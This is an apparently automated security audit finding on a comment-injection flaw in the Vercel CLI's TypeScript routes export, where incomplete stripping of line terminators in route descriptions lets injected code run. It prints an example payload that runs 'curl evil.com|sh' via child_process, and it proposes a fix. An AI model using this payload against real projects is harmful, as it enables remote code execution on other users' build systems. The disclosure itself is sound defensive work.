# [MEDIUM] Code injection in TS export via route description (incomplete line-terminator stripping)

**File:** [`packages/cli/src/commands/routes/export.ts`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/packages/cli/src/commands/routes/export.ts#L62-L64) (lines 62, 63, 64)
**Project:** vercel
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `other-code-injection`

## Owners

**Suggested assignee:** `25040341+brookemosby@users.noreply.github.com` _(via last-committer)_

## Finding

The routesToVercelTs() function emits route descriptions as single-line `// ...` comments in the generated TypeScript file. The sanitization `r.description.replace(/\n/g, ' ')` only strips `\n`, but ECMAScript treats four characters as line terminators that close single-line comments: LF (\n), CR (\r), LS (\u2028), and PS (\u2029). A team member with route-edit permission can set a description like `Bad route\u2028;require('child_process').execSync('curl evil.com|sh');//`. The generated `vercel.ts` file then contains a comment that terminates at the `\u2028`, followed by arbitrary JavaScript that the TypeScript compiler/Node parses and executes when another team member exports the routes (`vercel routes export --format ts > vercel.ts`) and the file is imported (e.g., during `vercel build` in CI/CD or by `vercel deploy`). This is a cross-user code execution path: attacker writes a description; victim exports and uses the generated file; victim's environment runs the injected code. Trust boundary: the description originates from API data and may not be fully sanitized by the server, and the CLI should not blindly trust server data either (defense-in-depth). Note that the JSON-format export is not vulnerable because JSON.stringify properly escapes all line terminators in string values.

## Recommendation

Replace ALL JavaScript line terminators with spaces (or escape them): `const safeDesc = r.description.replace(/[\r\n\u2028\u2029]/g, ' ');`. Better yet, since the description is informational metadata, consider emitting it as a JSDoc-style block comment or stringifying via JSON.stringify and embedding as a string-typed `description` property, both of which are robust against line-terminator injection.

## Recent committers (`git log`)

- Brooke <25040341+brookemosby@users.noreply.github.com> (2026-03-18)
- Thomas Knickman <tom.knickman@vercel.com> (2026-03-06)
- Yash Kothari <yashkoth7@gmail.com> (2026-03-05)
